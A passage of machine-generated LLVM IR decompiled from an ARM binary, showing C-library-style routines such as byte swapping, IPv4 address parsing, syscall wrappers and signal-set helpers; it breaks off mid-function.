define i32 @function_147bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_147bc:
  store i32 %arg1, i32* @r0, align 4
  %v3_147c0 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_147d4 = call i32 @function_131c4()
  store i32 %v3_147c0, i32* @r4, align 4
  ret i32 %v0_147d4
}

define i32 @function_147e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_147e4:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_14810 = call i32 @function_157a0(i32 283, i32 %arg1, i32 %arg2)
  store i32 %v3_14810, i32* @r0, align 4
  %v0_14814 = call i32 @function_131c4()
  ret i32 %v0_14814

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_14828(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14828:
  store i32 %arg1, i32* @r0, align 4
  %v3_1482c = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_14840 = call i32 @function_131c4()
  store i32 %v3_1482c, i32* @r4, align 4
  ret i32 %v0_14840
}

define i32 @function_14850(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14850:
  store i32 %arg1, i32* @r0, align 4
  %v3_14850 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14864 = call i32 @function_131c4()
  store i32 %v3_14850, i32* @r4, align 4
  ret i32 %v0_14864
}

define i32 @function_14874(i32 %arg1) local_unnamed_addr {
dec_label_pc_14874:
  %v2_14890 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_14890
}

define i32 @function_14898(i32 %arg1) local_unnamed_addr {
dec_label_pc_14898:
  %v3_14898 = udiv i32 %arg1, 256
  %v4_1489c = mul i32 %arg1, 256
  %v5_1489c = or i32 %v4_1489c, %v3_14898
  %v3_148a0 = mul i32 %v5_1489c, 65536
  store i32 %v3_148a0, i32* @r3, align 4
  %v3_148a4 = urem i32 %v5_1489c, 65536
  ret i32 %v3_148a4

; uselistorder directives
  uselistorder i32 %v5_1489c, { 1, 0 }
}

define i32 @function_148ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_148ac:
  %stack_var_-12 = alloca i32, align 4
  %v2_148b4 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_148b4, i32* @r1, align 4
  %v0_148b8 = call i32 @function_148d4()
  %v2_148bc = icmp eq i32 %v0_148b8, 0
  %v4_148c0 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_148bc, i32 -1, i32 %v4_148c0
  ret i32 %storemerge
}

define i32 @function_148d4() local_unnamed_addr {
dec_label_pc_148d4:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_148d4 = load i32, i32* @r4, align 4
  %v6_148d4 = load i32, i32* @r5, align 4
  %v9_148d4 = load i32, i32* @r6, align 4
  %v12_148d4 = load i32, i32* @r7, align 4
  %v15_148d4 = load i32, i32* @r8, align 4
  %v2_148dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_148dc, i32* @r4, align 4
  %v0_148e0 = load i32, i32* @r0, align 4
  store i32 %v0_148e0, i32* @r5, align 4
  %v0_148e4 = load i32, i32* @r1, align 4
  store i32 %v0_148e4, i32* @r8, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_148f4 = bitcast i32* %stack_var_-44 to i8*
  %v4_148f4 = call i32 @function_15594(i8* %v3_148f4, i32 0, i32 16)
  store i32 %v2_148dc, i32* @r7, align 4
  %v2_148fc = ptrtoint i8** %stack_var_-28 to i32
  store i32 %v2_148fc, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %dec_label_pc_1496c, %dec_label_pc_148d4
  store i32 %v2_148fc, i32* @r1, align 4
  %v0_14908 = load i32, i32* @r5, align 4
  store i32 %v0_14908, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_14910 = call i32 @function_150c8(i32 %v0_14908, i32 %v2_148fc, i32 0)
  %v3_14914 = load i8*, i8** %stack_var_-28, align 4
  %v4_14914 = ptrtoint i8* %v3_14914 to i32
  store i32 %v4_14914, i32* %r1.global-to-local, align 4
  %v1_14918 = load i32, i32* @r5, align 4
  %v9_14918 = icmp eq i32 %v4_14914, %v1_14918
  br i1 %v9_14918, label %dec_label_pc_149e8, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %dec_label_pc_14904
  %v2_14920 = load i8, i8* %v3_14914, align 1
  %v3_14920 = zext i8 %v2_14920 to i32
  store i32 %v3_14920, i32* %r2.global-to-local, align 4
  %v2_14924 = icmp eq i8 %v2_14920, 0
  br i1 %v2_14924, label %dec_label_pc_14930, label %bb

bb:                                               ; preds = %dec_label_pc_14920
  %v8_14928 = icmp eq i8 %v2_14920, 46
  br i1 %v8_14928, label %dec_label_pc_14930, label %dec_label_pc_149e8

dec_label_pc_14930:                               ; preds = %dec_label_pc_14920, %bb
  %v1_14930 = inttoptr i32 %v1_14918 to i8*
  %v2_14930 = load i8, i8* %v1_14930, align 1
  %v3_14930 = zext i8 %v2_14930 to i32
  %v1_14934 = add nsw i32 %v3_14930, -48
  %v1_1493c = add i32 %v4_14914, 1
  store i32 %v1_1493c, i32* @r5, align 4
  %tmp = icmp ugt i32 %v1_14934, 9
  br i1 %tmp, label %dec_label_pc_149e8, label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %dec_label_pc_14930
  %v1_14948 = load i32, i32* @r7, align 4
  %v2_14948 = load i32, i32* @r4, align 4
  %v5_14948 = mul i32 %v2_14948, 4
  %v6_14948 = add i32 %v5_14948, %v1_14948
  %v7_14948 = inttoptr i32 %v6_14948 to i32*
  store i32 %v3_14910, i32* %v7_14948, align 4
  %v0_14950 = load i32, i32* @r4, align 4
  br i1 %v2_14924, label %dec_label_pc_14950, label %dec_label_pc_1496c

dec_label_pc_14950:                               ; preds = %dec_label_pc_14944
  %v7_14950 = icmp eq i32 %v0_14950, 1
  br i1 %v7_14950, label %dec_label_pc_1498c, label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %dec_label_pc_14950
  %v7_14958 = icmp eq i32 %v0_14950, 2
  br i1 %v7_14958, label %dec_label_pc_149a4, label %dec_label_pc_14960

dec_label_pc_14960:                               ; preds = %dec_label_pc_14958
  %v2_14960 = icmp eq i32 %v0_14950, 0
  br i1 %v2_14960, label %dec_label_pc_1497c, label %dec_label_pc_149b8

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14944
  %v1_1496c = add i32 %v0_14950, 1
  store i32 %v1_1496c, i32* @r4, align 4
  %v7_14970 = icmp eq i32 %v1_1496c, 4
  br i1 %v7_14970, label %dec_label_pc_149e8, label %dec_label_pc_14904

dec_label_pc_1497c:                               ; preds = %dec_label_pc_14960
  %v3_1497c = load i32, i32* %stack_var_-44, align 4
  %v3_14980 = udiv i32 %v3_1497c, 16777216
  store i32 %v3_14980, i32* %r2.global-to-local, align 4
  %v1_14984 = urem i32 %v3_1497c, 16777216
  store i32 %v3_14980, i32* %stack_var_-44, align 4
  br label %dec_label_pc_1498c

dec_label_pc_1498c:                               ; preds = %dec_label_pc_14950, %dec_label_pc_1497c
  %stack_var_-40.0 = phi i32 [ %tmp6, %dec_label_pc_14950 ], [ %v1_14984, %dec_label_pc_1497c ]
  %v3_14994 = urem i32 %stack_var_-40.0, 65536
  %v3_14998 = udiv i32 %stack_var_-40.0, 65536
  store i32 %v3_14998, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14958, %dec_label_pc_1498c
  %stack_var_-36.0 = phi i32 [ %v3_14994, %dec_label_pc_1498c ], [ %tmp5, %dec_label_pc_14958 ]
  %v3_149a8 = udiv i32 %stack_var_-36.0, 256
  store i32 %v3_149a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_14960, %dec_label_pc_149a4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v2_148dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_149cc.dec_label_pc_149c0_crit_edge, %dec_label_pc_149b8
  %v2_149cc = phi i32 [ %v1_149d0, %dec_label_pc_149cc.dec_label_pc_149c0_crit_edge ], [ 0, %dec_label_pc_149b8 ]
  %v0_149c0 = phi i32 [ %v0_149c0.pre, %dec_label_pc_149cc.dec_label_pc_149c0_crit_edge ], [ %v2_148dc, %dec_label_pc_149b8 ]
  %v4_149c0 = mul i32 %v2_149cc, 4
  %v5_149c0 = add i32 %v4_149c0, %v0_149c0
  %v6_149c0 = inttoptr i32 %v5_149c0 to i32*
  %v7_149c0 = load i32, i32* %v6_149c0, align 4
  %tmp18 = icmp ugt i32 %v7_149c0, 255
  br i1 %tmp18, label %dec_label_pc_149e8, label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_149c0
  %v1_149cc = trunc i32 %v7_149c0 to i8
  %v3_149cc = load i32, i32* @r8, align 4
  %v4_149cc = add i32 %v3_149cc, %v2_149cc
  %v5_149cc = inttoptr i32 %v4_149cc to i8*
  store i8 %v1_149cc, i8* %v5_149cc, align 1
  %v0_149d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_149d0 = add i32 %v0_149d0, 1
  store i32 %v1_149d0, i32* %r2.global-to-local, align 4
  %v7_149d4 = icmp eq i32 %v1_149d0, 4
  br i1 %v7_149d4, label %dec_label_pc_149e8, label %dec_label_pc_149cc.dec_label_pc_149c0_crit_edge

dec_label_pc_149cc.dec_label_pc_149c0_crit_edge:  ; preds = %dec_label_pc_149cc
  %v0_149c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_149c0

dec_label_pc_149e8:                               ; preds = %dec_label_pc_14904, %dec_label_pc_14930, %dec_label_pc_1496c, %bb, %dec_label_pc_149c0, %dec_label_pc_149cc
  %storemerge = phi i32 [ 1, %dec_label_pc_149cc ], [ 0, %dec_label_pc_149c0 ], [ 0, %bb ], [ 0, %dec_label_pc_1496c ], [ 0, %dec_label_pc_14930 ], [ 0, %dec_label_pc_14904 ]
  store i32 %v3_148d4, i32* @r4, align 4
  store i32 %v6_148d4, i32* @r5, align 4
  store i32 %v9_148d4, i32* @r6, align 4
  store i32 %v12_148d4, i32* @r7, align 4
  store i32 %v15_148d4, i32* @r8, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_149d0, { 1, 2, 0 }
  uselistorder i32 %v7_149c0, { 1, 0 }
  uselistorder i32 %v3_14980, { 1, 0 }
  uselistorder i32 %v3_1497c, { 1, 0 }
  uselistorder i32 %v0_14950, { 3, 0, 1, 2 }
  uselistorder i32 %v2_148fc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-28, { 1, 0 }
  uselistorder i8 46, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_149e8, { 5, 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_149b8, { 1, 0 }
  uselistorder label %dec_label_pc_149a4, { 1, 0 }
  uselistorder label %dec_label_pc_1498c, { 1, 0 }
  uselistorder label %dec_label_pc_14930, { 1, 0 }
}

define i32 @function_149f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_149f4:
  store i32 0, i32* @r2, align 4
  %v3_149f8 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_14a10 = call i32 @function_131c4()
  store i32 %v3_149f8, i32* @r4, align 4
  ret i32 %v0_14a10
}

define i32 @function_14a1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a1c:
  %v2_14a38 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_14a38
}

define i32 @function_14a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a40:
  %v3_14a40 = udiv i32 %arg1, 256
  %v4_14a44 = mul i32 %arg1, 256
  %v5_14a44 = or i32 %v4_14a44, %v3_14a40
  %v3_14a4c = urem i32 %v5_14a44, 65536
  ret i32 %v3_14a4c
}

define i32 @function_14a54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14a54:
  %v0_14a68 = call i32 @function_14a78()
  ret i32 %v0_14a68

; uselistorder directives
  uselistorder i32 ()* @function_14a78, { 0, 1, 3, 2 }
}

define i32 @function_14a78() local_unnamed_addr {
dec_label_pc_14a78:
  %v0_14a78 = load i32, i32* @lr, align 4
  %v0_14a7c = load i32, i32* @r1, align 4
  %v0_14a84 = load i32, i32* @r2, align 4
  store i32 %v0_14a84, i32* @lr, align 4
  store i32 %v0_14a7c, i32* @r2, align 4
  %v0_14a98 = load i32, i32* @r0, align 4
  store i32 %v0_14a84, i32* @r3, align 4
  %v3_14aac = call i32 @function_157a0(i32 292, i32 %v0_14a98, i32 %v0_14a7c)
  store i32 %v3_14aac, i32* @r0, align 4
  %v0_14ab0 = call i32 @function_131c4()
  store i32 %v0_14a78, i32* @lr, align 4
  ret i32 %v0_14ab0
}

define i32 @function_14ac0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14ac0:
  %v0_14ad4 = call i32 @function_14ae4()
  ret i32 %v0_14ad4

; uselistorder directives
  uselistorder i32 ()* @function_14ae4, { 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
}

define i32 @function_14ae4() local_unnamed_addr {
dec_label_pc_14ae4:
  %v0_14ae4 = load i32, i32* @lr, align 4
  %v0_14ae8 = load i32, i32* @r1, align 4
  %v0_14af0 = load i32, i32* @r2, align 4
  store i32 %v0_14af0, i32* @lr, align 4
  store i32 %v0_14ae8, i32* @r2, align 4
  %v0_14b04 = load i32, i32* @r0, align 4
  store i32 %v0_14af0, i32* @r3, align 4
  %v3_14b18 = call i32 @function_157a0(i32 290, i32 %v0_14b04, i32 %v0_14ae8)
  store i32 %v3_14b18, i32* @r0, align 4
  %v0_14b1c = call i32 @function_131c4()
  store i32 %v0_14ae4, i32* @lr, align 4
  ret i32 %v0_14b1c
}

define i32 @function_14b30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14b30:
  %v3_14b30 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14b44 = call i32 @function_131c4()
  store i32 %v3_14b30, i32* @r4, align 4
  ret i32 %v0_14b44
}

define i32 @function_14b50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14b50:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14b50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b50, label %bb, label %dec_label_pc_14b50._crit_edge

bb:                                               ; preds = %dec_label_pc_14b50
  %v1_14b50 = load i32, i32* %r0.global-to-local, align 4
  %v2_14b50 = load i32, i32* @r6, align 4
  %v5_14b50 = udiv i32 %v2_14b50, 4
  %v6_14b50 = and i32 %v5_14b50, %v1_14b50
  store i32 %v6_14b50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b50._crit_edge

dec_label_pc_14b50._crit_edge:                    ; preds = %dec_label_pc_14b50, %bb
  store i32 %arg2, i32* %r0.global-to-local, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14b50._crit_edge, { 1, 0 }
}

define i32 @function_14b74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14b74:
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  ret i32 %arg2
}

define i32 @function_14ba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14ba0:
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_14ba0 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v7_14bd4 = call i32 @function_14b74(i32 281, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_14bd4, i32* @r0, align 4
  %v0_14bd8 = call i32 @function_131c4()
  %v1_14bdc = icmp slt i32 %v0_14bd8, 0
  br i1 %v1_14bdc, label %dec_label_pc_14be4, label %dec_label_pc_14c80

dec_label_pc_14be4:                               ; preds = %dec_label_pc_14ba0
  %v0_14be4 = call i32 @function_12f18()
  %v1_14be8 = inttoptr i32 %v0_14be4 to i32*
  %v2_14be8 = load i32, i32* %v1_14be8, align 4
  %v7_14bec = icmp eq i32 %v2_14be8, 22
  br i1 %v7_14bec, label %dec_label_pc_14c04, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14be4
  %v0_14bf4 = call i32 @function_12f18()
  %v1_14bf8 = inttoptr i32 %v0_14bf4 to i32*
  %v2_14bf8 = load i32, i32* %v1_14bf8, align 4
  store i32 %v2_14bf8, i32* @r3, align 4
  %v7_14bfc = icmp eq i32 %v2_14bf8, 93
  br i1 %v7_14bfc, label %dec_label_pc_14c04, label %dec_label_pc_14c80

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14bf4, %dec_label_pc_14be4
  %v0_14c08 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c08 = and i32 %v0_14c08, 526336
  store i32 %v2_14c08, i32* @r3, align 4
  %v2_14c0c = icmp eq i32 %v2_14c08, 0
  br i1 %v2_14c0c, label %dec_label_pc_14c80, label %dec_label_pc_14c14

dec_label_pc_14c14:                               ; preds = %dec_label_pc_14c04
  %v0_14c18 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c1c = and i32 %v0_14c08, -526337
  %v0_14c20 = load i32, i32* %r8.global-to-local, align 4
  %v0_14c28 = load i32, i32* @r4, align 4
  %v7_14c34 = call i32 @function_14b74(i32 281, i32 %v0_14c18, i32 %v1_14c1c, i32 %v0_14c20, i32 %v0_14c28, i32 %v0_14c28, i32 %v0_14c28)
  store i32 %v7_14c34, i32* @r0, align 4
  %v0_14c38 = call i32 @function_131c4()
  %v1_14c3c = icmp slt i32 %v0_14c38, 0
  br i1 %v1_14c3c, label %dec_label_pc_14c80, label %dec_label_pc_14c44

dec_label_pc_14c44:                               ; preds = %dec_label_pc_14c14
  %v0_14c44 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c44 = and i32 %v0_14c44, 524288
  %v2_14c44 = icmp eq i32 %v1_14c44, 0
  br i1 %v2_14c44, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_14c44
  store i32 1, i32* @r3, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14c44, %bb
  %v1_14c58 = xor i1 %v2_14c44, true
  call void @__pseudo_cond_branch(i1 %v1_14c58, i32 ptrtoint (i32* @global_var_14b54.599 to i32))
  %v0_14c5c = load i32, i32* %r5.global-to-local, align 4
  %v1_14c5c = and i32 %v0_14c5c, 2048
  %v2_14c5c = icmp eq i32 %v1_14c5c, 0
  br i1 %v2_14c5c, label %.thread5, label %bb15

bb15:                                             ; preds = %.thread2
  store i32 2048, i32* @r3, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread2, %bb15
  %v1_14c70 = xor i1 %v2_14c5c, true
  call void @__pseudo_cond_branch(i1 %v1_14c70, i32 ptrtoint (i32* @global_var_14b54.599 to i32))
  br label %dec_label_pc_14c80

dec_label_pc_14c80:                               ; preds = %dec_label_pc_14c04, %dec_label_pc_14ba0, %dec_label_pc_14bf4, %.thread5, %dec_label_pc_14c14
  %storemerge.in = phi i32* [ @r4, %dec_label_pc_14c14 ], [ @r4, %.thread5 ], [ @r6, %dec_label_pc_14bf4 ], [ @r6, %dec_label_pc_14ba0 ], [ @r6, %dec_label_pc_14c04 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %v3_14ba0, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 524288, { 6, 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_14b74, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14c80, { 3, 4, 0, 2, 1 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14c8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c8c:
  %v0_14c8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c8c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c8c
  %v2_14c8c = load i32, i32* @sb, align 4
  %v8_14c8c = shl i32 %v2_14c8c, %arg2
  %v9_14c8c = and i32 %v8_14c8c, %arg1
  %v1_14c90 = load i32, i32* @r8, align 4
  %v5_14c90 = mul i32 %v9_14c8c, 65536
  %v6_14c90 = and i32 %v5_14c90, %v1_14c90
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c8c, %bb
  %v7_14c90 = phi i32 [ %arg1, %dec_label_pc_14c8c ], [ %v6_14c90, %bb ]
  ret i32 %v7_14c90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14c94() local_unnamed_addr {
dec_label_pc_14c94:
  %v1_14c94 = load i32, i32* @r0, align 4
  ret i32 %v1_14c94
}

define i32 @function_14c98() local_unnamed_addr {
dec_label_pc_14c98:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v15_14c98 = load i32, i32* @lr, align 4
  store i32 -1, i32* @r0, align 4
  %v2_14ca0 = ptrtoint i32* %stack_var_-152 to i32
  %v1_14cac = call i32 @function_14c94()
  %v1_14cb8 = call i32 @function_14d8c(i32 %v2_14ca0)
  store i32 %v1_14cb8, i32* @r0, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v0_14cc4 = call i32 @function_131c4()
  store i32 %v0_14cc4, i32* %r4.global-to-local, align 4
  %v2_14cc8 = icmp eq i32 %v0_14cc4, 0
  br i1 %v2_14cc8, label %dec_label_pc_14cd0, label %dec_label_pc_14cf4

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14c98
  %v0_14cd0 = call i32 @function_15dac()
  store i32 %v0_14cd0, i32* %r2.global-to-local, align 4
  %v0_14cd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_14cd8 = add i32 %v0_14cd8, 222
  store i32 %v1_14cd8, i32* %r7.global-to-local, align 4
  %v2_14ce4 = add i32 %v0_14cd0, -176
  %v3_14ce4 = inttoptr i32 %v2_14ce4 to i32*
  store i32 %v0_14cd0, i32* %v3_14ce4, align 4
  %v0_14ce8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ce8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ce8 = add i32 %v1_14ce8, -60
  %v3_14ce8 = inttoptr i32 %v2_14ce8 to i32*
  store i32 %v0_14ce8, i32* %v3_14ce8, align 4
  %v0_14cec = load i32, i32* %r4.global-to-local, align 4
  %v1_14cec = load i32, i32* %r2.global-to-local, align 4
  %v2_14cec = add i32 %v1_14cec, -64
  %v3_14cec = inttoptr i32 %v2_14cec to i32*
  store i32 %v0_14cec, i32* %v3_14cec, align 4
  %v0_14cf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14cf0, i32* @global_var_22b38.560, align 4
  br label %dec_label_pc_14cf4

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14c98, %dec_label_pc_14cd0
  %v1_14cf8 = call i32 @function_14df4(i32 %v2_14ca0)
  %v0_14cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cfc = sub i32 1, %v0_14cfc
  %v2_14cfc = icmp ult i32 %v0_14cfc, 2
  br i1 %v2_14cfc, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_14cf4
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_14cf4, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14cfc, %dec_label_pc_14cf4 ]
  store i32 %storemerge, i32* @r0, align 4
  %v1_14d08 = call i32 @function_14c94()
  %v0_14d0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v15_14c98, i32* @lr, align 4
  ret i32 %v0_14d0c

; uselistorder directives
  uselistorder i32 -64, { 2, 0, 1 }
  uselistorder i32 222, { 1, 0 }
  uselistorder i32 ()* @function_14c94, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_14cf4, { 1, 0 }
}

define i32 @function_14d24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14d24:
  %v0_14d24 = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_14d54 = call i32 @function_157a0(i32 142, i32 %arg1, i32 %arg2)
  store i32 %v3_14d54, i32* @r0, align 4
  %v0_14d58 = call i32 @function_131c4()
  store i32 %v0_14d24, i32* @lr, align 4
  ret i32 %v0_14d58
}

define i32 @function_14d68(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14d68:
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  ret i32 %arg2
}

define i32 @function_14d8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d8c:
  %v5_14dac = call i32 @function_14d68(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19ffc.604 to i32), i32 %arg1, i32 8)
  ret i32 %v5_14dac
}

define i32 @function_14dc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14dc0:
  %v5_14de0 = call i32 @function_14d68(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19ff4.606 to i32), i32 %arg1, i32 8)
  ret i32 %v5_14de0
}

define i32 @function_14df4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14df4:
  store i32 8, i32* @ip, align 4
  %v5_14e14 = call i32 @function_14d68(i32 175, i32 2, i32 %arg1, i32 0, i32 8)
  ret i32 %v5_14e14

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14d68, { 1, 0, 2 }
}

define i32 @function_14e24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14e24:
  %v0_14e30 = call i32 @function_131c4()
  ret i32 %v0_14e30
}

define i32 @function_14e3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14e3c:
  %stack_var_-144 = alloca i32, align 4
  %v3_14e3c = load i32, i32* @r4, align 4
  %v2_14e40 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %arg1, i32* @r4, align 4
  %v1_14e50 = call i32 @function_14dc0(i32 %v2_14e40)
  store i32 %v1_14e50, i32* @r0, align 4
  %v0_14e68 = call i32 @function_131c4()
  %v1_14e74 = call i32 @function_14df4(i32 %v2_14e40)
  store i32 %v3_14e3c, i32* @r4, align 4
  ret i32 %v0_14e68
}

define i32 @function_14e88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14e88:
  %r2.global-to-local = alloca i32, align 4
  %v1_14e90 = add i32 %arg2, -1
  %tmp = icmp ugt i32 %v1_14e90, 63
  br i1 %tmp, label %dec_label_pc_14eb0, label %dec_label_pc_14ea4

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14e88
  %v1_14ea4 = add i32 %arg2, -32
  %tmp4 = icmp ugt i32 %v1_14ea4, 2
  br i1 %tmp4, label %dec_label_pc_14ec4, label %dec_label_pc_14eb0

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14ea4, %dec_label_pc_14e88
  %v0_14eb0 = call i32 @function_12f18()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14ebc = inttoptr i32 %v0_14eb0 to i32*
  store i32 22, i32* %v2_14ebc, align 4
  %v0_14ee0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ee0

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14ea4
  %v3_14ec4 = udiv i32 %v1_14e90, 32
  %v4_14ec8 = mul nuw nsw i32 %v3_14ec4, 4
  %v5_14ec8 = add i32 %v4_14ec8, %arg1
  %v6_14ec8 = inttoptr i32 %v5_14ec8 to i32*
  %v7_14ec8 = load i32, i32* %v6_14ec8, align 4
  %v1_14ed0 = urem i32 %v1_14e90, 32
  %v7_14ed4 = shl i32 1, %v1_14ed0
  %v8_14ed4 = or i32 %v7_14ec8, %v7_14ed4
  store i32 %v8_14ed4, i32* %v6_14ec8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ee0

